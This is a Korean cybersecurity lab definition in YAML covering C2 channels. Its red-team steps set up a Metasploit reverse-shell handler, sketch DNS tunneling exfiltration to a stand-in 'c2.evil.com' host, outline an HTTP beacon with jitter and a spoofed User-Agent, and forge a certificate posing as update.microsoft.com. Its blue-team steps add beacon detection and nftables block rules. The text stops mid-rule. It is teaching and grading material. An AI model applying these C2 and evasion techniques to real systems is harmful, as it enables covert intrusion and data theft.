lab_id: battle-adv-ai-week03
title: C2 채널 구축과 탐지 — Command & Control 인프라 (AI 지원)
version: ai
course: battle-adv-ai
week: 3
description: Command & Control(C2) 인프라의 구조와 통신 기법을 분석한다. DNS, HTTP, HTTPS 기반 C2 채널을 시뮬레이션하고, 비컨 패턴 탐지,
  JA3 핑거프린팅, nftables 차단 규칙을 구현하여 C2 통신을 탐지/차단한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- C2 인프라의 구성 요소와 통신 구조를 이해한다
- DNS, HTTP, HTTPS 기반 C2 채널을 시뮬레이션한다
- C2 트래픽의 네트워크 시그니처를 식별하고 차단한다
prerequisites:
- battle-adv-nonai week02 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] Metasploit의 multi/handler를 설정하여 C2 리스너의 기본 구조를 이해하라. 설정을 확인한 후 종료하라.'
  hint: msfconsole -q -x 명령으로 handler를 자동 설정한다.
  category: recon
  points: 10
  answer: '🤖 프롬프트: [RED] Metasploit의 multi/handler를 설정하여 C2 리스너의 기본 구조를 이해해줘

    📎 참고 (CLI): msfconsole -q -x ''use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp;
    set LHOST 10.20.30.201; set LPORT 4444; show options; exit'' 2>&1 | tail -20'
  answer_detail: C2 리스너는 침투된 시스템으로부터 역연결을 수신한다. Metasploit의 multi/handler는 범용 리스너로, LHOST는 리스너 IP, LPORT는
    수신 포트이다.
  verify:
    type: output_contains
    expect: LHOST
    semantic:
      intent: '[RED] Metasploit multi/handler C2 리스너 기본 구조 — msfconsole -q -x use exploit/multi/handler;
        set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST; set LPORT; show options; exit. 실제 실행
        없이 설정만 확인. C2 리스너 동작 원리 이해 (payload 타입·LHOST/LPORT·연결 처리)'
      success_criteria:
      - msfconsole + use multi/handler
      - show options 로 설정 확인
      - 실제 exploit 없음 (exit)
      acceptable_methods:
      - msfconsole -x 로 자동 명령
      - msfconsole resource script
      - sliver server + listener 대체
      - python socketserver 직접 구현
      negative_signs:
      - 실제 listener 실행 (교육 목적 초과)
      - show options 없이 스킵
      - C2 개념 없음
  target_vm: attacker
  script: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp;
    set LHOST 10.20.30.201; set LPORT 4444; show options; exit' 2>&1 | tail -20
  risk_level: low
  bastion_prompt: '[RED] Metasploit의 multi/handler를 설정하여 C2 리스너의 기본 구조를 이해해줘'
- order: 2
  instruction: '[RED] DNS 터널링을 시뮬레이션하라. 데이터를 base64 인코딩 후 63바이트 단위로 분할하여 DNS 서브도메인으로 전송하는 스크립트를 작성하라.'
  hint: base64 인코딩 후 청크 분할하여 서브도메인으로 구성한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] DNS 터널링을 시뮬레이션하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): cat > /tmp/dns_c2_sim.sh << ''SCRIPT'' #!/bin/bash DATA="Sensitive_Data_Exfil_Test_2026"
    ENCODED=$(echo -n "$DATA" | base64 | tr "+/" "-_" | tr -d "=") echo "=== DNS C2 Simulation ===" echo
    "Original: $DATA" echo "Encoded subdomain: ${ENCODED}.c2.test.local" echo "Chunk size: ${#ENCODED}
    bytes (max 63 per label)" SCRIPT chmod +x /tmp/dns_c2_sim.sh && bash /tmp/dns_c2_sim.sh'
  answer_detail: DNS C2(T1071.004)는 DNS 쿼리/응답에 데이터를 은닉하여 통신한다. 서브도메인에 base64 인코딩 데이터를 삽입하면 DNS 서버를 경유하여
    C2 서버로 전달된다.
  verify:
    type: output_contains
    expect: DNS C2 Simulation
    semantic:
      intent: '[RED] DNS 터널링 시뮬레이션 — python3 으로 data=base64.b64encode(payload) + 63바이트 단위 분할 (DNS label
        길이 제한) + for chunk in chunks: dig TXT <chunk>.c2.evil.com 반복. DNS 는 아웃바운드 통상 허용 → 데이터 유출 채널 악용.
        iodine/dnscat2 의 원리. MITRE T1071.004'
      success_criteria:
      - base64 인코딩 + 63바이트 분할
      - DNS 쿼리 embedding + 반복 전송 스크립트
      - DNS label 제한 인지
      acceptable_methods:
      - python3 base64 + dig/dnspython
      - iodine 실제 도구 (교육)
      - dnscat2 PoC
      - xxd + base32 대체
      negative_signs:
      - 63바이트 분할 없음
      - DNS 아닌 HTTP
      - base64 없이 평문
  target_vm: attacker
  script: 'cat > /tmp/dns_c2_sim.sh << ''SCRIPT'' #!/bin/bash DATA="Sensitive_Data_Exfil_Test_2026" ENCODED=$(echo
    -n "$DATA" | base64 | tr "+/" "-_" | tr -d "=") echo "=== DNS C2 Simulation ===" echo "Original: $DATA"
    echo "Encoded subdomain: ${ENCODED}.c2.test.local" echo "Chunk size: ${#ENCODED} bytes (max 63 per
    label)" SCRIPT chmod +x /tmp/dns_c2_sim.sh && bash /tmp/dns_c2_sim.sh'
  risk_level: medium
  bastion_prompt: '[RED] DNS 터널링을 시뮬레이션하라. 데이터를 base64 인코딩 후 63바이트 단위로 분할하여 DNS 서브도메인으로 전송하는 스크립트를 작성하라.'
- order: 3
  instruction: '[RED] HTTP 기반 C2 비컨(beacon)을 시뮬레이션하는 스크립트를 작성하라. 주기적 check-in, jitter, 정상 User-Agent 위장을
    포함하라.'
  hint: curl을 사용하여 C2 서버에 주기적으로 check-in하는 구조를 작성한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] HTTP 기반 C2 비컨(beacon)을 시뮬레이션하는 스크립트를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/http_c2_beacon.sh << ''SCRIPT'' #!/bin/bash echo "=== HTTP C2 Beacon Simulation
    ===" echo "C2 Server: http://10.20.30.201:8080" echo "Beacon ID: $(hostname)-$(id -u)" echo "Sleep:
    30s (+/- 10s jitter)" echo "Check-in: GET /api/beacon?id=$(hostname)-$(id -u)&type=checkin" echo "Task
    fetch: GET /api/tasks?id=$(hostname)-$(id -u)" echo "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;
    x64) AppleWebKit/537.36" SCRIPT bash /tmp/http_c2_beacon.sh'
  answer_detail: HTTP C2(T1071.001)는 정상 웹 트래픽으로 위장하여 탐지를 회피한다. jitter를 추가하여 패턴 탐지를 어렵게 만들고, 정상 브라우저 User-Agent로
    위장한다.
  verify:
    type: output_contains
    expect: HTTP C2 Beacon
    semantic:
      intent: '[RED] HTTP C2 비컨 시뮬레이션 — python3 while True: jitter=random.uniform(0.7, 1.3); sleep_sec=base_interval
        * jitter; headers={User-Agent: Mozilla/5.0 정상 브라우저}; requests.get(c2_url, headers=headers). 주기적
        check-in + jitter 로 탐지 회피 + 정상 UA 위장. MITRE T1071.001 Web Protocols'
      success_criteria:
      - while True 루프 + sleep (주기적)
      - jitter (random factor)
      - 정상 User-Agent 위장
      - HTTP 비컨 패턴
      acceptable_methods:
      - python requests + random sleep
      - curl 반복 + sleep
      - Cobalt Strike beacon config
      - Mythic Apollo beacon
      negative_signs:
      - jitter 없는 고정 간격 (탐지됨)
      - 기본 UA 사용
      - 비컨 개념 없음
  target_vm: attacker
  script: 'cat > /tmp/http_c2_beacon.sh << ''SCRIPT'' #!/bin/bash echo "=== HTTP C2 Beacon Simulation
    ===" echo "C2 Server: http://10.20.30.201:8080" echo "Beacon ID: $(hostname)-$(id -u)" echo "Sleep:
    30s (+/- 10s jitter)" echo "Check-in: GET /api/beacon?id=$(hostname)-$(id -u)&type=checkin" echo "Task
    fetch: GET /api/tasks?id=$(hostname)-$(id -u)" echo "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;
    x64) AppleWebKit/537.36" SCRIPT bash /tmp/http_c2_beacon.sh'
  risk_level: medium
  bastion_prompt: '[RED] HTTP 기반 C2 비컨(beacon)을 시뮬레이션하는 스크립트를 작성하라. 주기적 check-in, jitter, 정상 User-Agent
    위장을 포함하라.'
- order: 4
  instruction: '[RED] HTTPS C2를 위한 자체 서명 인증서를 생성하라. CN을 유명 서비스 도메인으로 위장하라.'
  hint: openssl req 명령으로 자체 서명 인증서를 생성한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] HTTPS C2를 위한 자체 서명 인증서를 생성하라. CN을 유명 서비스 도메인으로 위장해줘

    📎 참고 (CLI): openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days
    365 -nodes -subj ''/CN=update.microsoft.com/O=Microsoft Corporation/C=US'' 2>&1 && openssl x509 -in
    /tmp/c2_cert.pem -noout -subject -dates'
  answer_detail: HTTPS C2는 TLS 암호화로 트래픽을 은닉한다. CN을 정상 도메인으로 위장하면 기본적인 검사를 통과시키지만, 인증서 체인 검증(CT 로그)으로 탐지
    가능하다.
  verify:
    type: output_contains
    expect: update.microsoft.com
    semantic:
      intent: '[RED] HTTPS C2 자체 서명 인증서 — openssl req -x509 -newkey rsa:2048 -nodes -keyout c2.key -out
        c2.crt -days 365 -subj /CN=google.com/O=Google Inc. CN 을 유명 서비스(google.com/cloudflare.com)로 위장해
        TLS 메타데이터 인스펙션 회피 시도. 실제 CA 서명 없어 self-signed red flag'
      success_criteria:
      - openssl req -x509 로 자체 서명
      - CN 위장 (google.com 등 유명 도메인)
      - RSA 2048 + -days 365
      - self-signed red flag 인지
      acceptable_methods:
      - openssl req -x509 -newkey + -subj /CN=...
      - mkcert 로 로컬 CA 서명
      - Lets Encrypt 로 합법 서명 (실전)
      - Cobalt Strike malleable C2 TLS profile
      negative_signs:
      - 자체 서명 원리 이해 없음
      - CN 위장 없음
      - 공개 CA 서명 (실제 서비스)
  target_vm: attacker
  script: openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days 365 -nodes
    -subj '/CN=update.microsoft.com/O=Microsoft Corporation/C=US' 2>&1 && openssl x509 -in /tmp/c2_cert.pem
    -noout -subject -dates
  risk_level: medium
  bastion_prompt: '[RED] HTTPS C2를 위한 자체 서명 인증서를 생성하라. CN을 유명 서비스 도메인으로 위장해줘'
- order: 5
  instruction: '[BLUE] Phase 전환 — C2 비컨의 주기적 통신 패턴을 탐지하는 통계 분석 스크립트를 작성하라. 연결 간격의 변동계수가 15% 미만이면 비컨 패턴으로
    판정하라.'
  hint: 연결 시간 간격의 표준편차를 계산하여 주기성을 탐지한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Phase 전환 — C2 비컨의 주기적 통신 패턴을 탐지하는 통계 분석 스크립트를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/beacon_detector.sh << ''SCRIPT'' #!/bin/bash echo "=== C2 Beacon Pattern Detector
    ===" python3 -c " import statistics intervals = [30, 31, 29, 30, 32, 28, 31, 30, 29, 31] mean = statistics.mean(intervals)
    stdev = statistics.stdev(intervals) cv = stdev / mean * 100 print(f\"Mean interval: {mean:.1f}s\")
    print(f\"Std deviation: {stdev:.2f}s\") print(f\"Coefficient of variation: {cv:.1f}%\") print(f\"Beacon
    likelihood: {''HIGH'' if cv < 15 else ''LOW''}\") print(f\"Estimated sleep: {mean:.0f}s with jitter
    +/-{stdev:.0f}s\") " SCRIPT bash /tmp/beacon_detector.sh'
  answer_detail: C2 비컨은 일정한 간격으로 check-in하며 jitter를 추가해도 통계적 주기성이 남는다. 변동계수(CV) 15% 미만이면 비컨 패턴 가능성이 높다.
  verify:
    type: output_contains
    expect: Beacon likelihood
    semantic:
      intent: '[BLUE] C2 비컨 통계 분석 — python3 로 연결 로그에서 각 src_ip 별 연결 간격 리스트 추출 + stdev/mean < 0.15 (변동계수
        15% 이하) = 규칙적 비컨 의심 로직. 주기적 C2 통신의 통계적 특성 탐지 (Shannon 엔트로피 / periodogram 대안). ML 아닌 statistical
        anomaly detection'
      success_criteria:
      - 연결 간격 리스트 추출 + 변동계수 계산
      - 변동계수 < 0.15 임계치 C2 후보 식별
      - 통계적 이상치 탐지 개념
      acceptable_methods:
      - python numpy 로 stdev/mean
      - RITA Beacon Analysis 도구
      - Zeek + RITA 통합
      - Splunk stats 명령
      negative_signs:
      - 통계 없이 단순 카운트
      - 변동계수 개념 없음
      - C2 beacon 특성 없음
  target_vm: secu
  script: 'cat > /tmp/beacon_detector.sh << ''SCRIPT'' #!/bin/bash echo "=== C2 Beacon Pattern Detector
    ===" python3 -c " import statistics intervals = [30, 31, 29, 30, 32, 28, 31, 30, 29, 31] mean = statistics.mean(intervals)
    stdev = statistics.stdev(intervals) cv = stdev / mean * 100 print(f\"Mean interval: {mean:.1f}s\")
    print(f\"Std deviation: {stdev:.2f}s\") print(f\"Coefficient of variation: {cv:.1f}%\") print(f\"Beacon
    likelihood: {''HIGH'' if cv < 15 else ''LOW''}\") print(f\"Estimated sleep: {mean:.0f}s with jitter
    +/-{stdev:.0f}s\") " SCRIPT bash /tmp/beacon_detector.sh'
  risk_level: low
  bastion_prompt: '[BLUE] Phase 전환 — C2 비컨의 주기적 통신 패턴을 탐지하는 통계 분석 스크립트를 작성하라. 연결 간격의 변동계수가 15% 미만이면 비컨
    패턴으로 판정하라.'
- order: 6
  instruction: '[BLUE] nftables로 C2 통신을 차단하는 방화벽 규칙을 작성하라. 비표준 아웃바운드 포트 차단, DNS 쿼리 레이트 리밋, 알려진 C2 IP 차단을
    구현하라.'
  hint: nft add rule 형태로 체인에 규칙을 추가한다.
  category: defense
  points: 10
  answer: "\U0001F916 프롬프트: [BLUE] nftables로 C2 통신을 차단하는 방화벽 규칙을 구현 방법을 설명하고 예시 코드를 보여줘\n\U0001F4CE 참고\
    \ (CLI): cat > /tmp/c2_block_rules.nft << 'EOF'\n#!/usr/sbin/nft -f\ntable inet c2_block {\n  set\
    \ blocked_c2_ips {\n    type ipv4_addr\n    elements = { 198.51.100.1, 203.0.113.50 }\n  }\n  chain\
    \ output {\n    type filter hook output priority 0; policy accept;\n    ip daddr @blocked_c2_ips drop\n\
    \    tcp dport { 4444, 5555, 8443, 9999 } log prefix \"C2_PORT_BLOCK: \" drop\n    udp dport 53 limit\
    \ rate over 30/second log prefix \"DNS_FLOOD: \" drop\n  }\n}\nEOF\ncat /tmp/c2_block_rules.nft"
  answer_detail: 'nftables로 C2 차단: (1) 알려진 C2 IP 블랙리스트, (2) 비표준 아웃바운드 포트 차단(4444 등), (3) DNS 쿼리 레이트 리밋(터널링
    방지). log prefix로 차단 이벤트를 기록한다.'
  verify:
    type: output_contains
    expect: c2_block
    semantic:
      intent: '[BLUE] nftables C2 차단 룰 — 비표준 아웃바운드 포트 차단 (tcp dport != {80,443,22,53} drop) + DNS 쿼리 rate
        limit (udp dport 53 limit rate 100/minute) + 블랙리스트 도메인 ip 차단. 아웃바운드 필터링으로 C2 exfiltration 봉쇄.
        화이트리스트 방식 출구 정책'
      success_criteria:
      - nft add rule output tcp dport != <허용> drop
      - DNS rate limit 추가
      - 아웃바운드 필터링 개념
      acceptable_methods:
      - nft output drop 정책 + 화이트리스트
      - iptables -A OUTPUT -p tcp --dport ! <list>
      - pi-hole DNS 필터링
      - Squid proxy + 카테고리 필터
      negative_signs:
      - input 만 차단 (outbound 없음)
      - 화이트리스트 개념 없음
      - DNS rate limit 누락
  target_vm: secu
  script: "cat > /tmp/c2_block_rules.nft << 'EOF'\n#!/usr/sbin/nft -f\ntable inet c2_block {\n  set blocked_c2_ips\
    \ {\n    type ipv4_addr\n    elements = { 198.51.100.1, 203.0.113.50 }\n  }\n  chain output {\n  \
    \  type filter hook output priority 0; policy accept;\n    ip daddr @blocked_c2_ips drop\n    tcp\
    \ dport { 4444, 5555, 8443, 9999 } log prefix \"C2_PORT_BLOCK: \" drop\n    udp dport 53 limit rate\
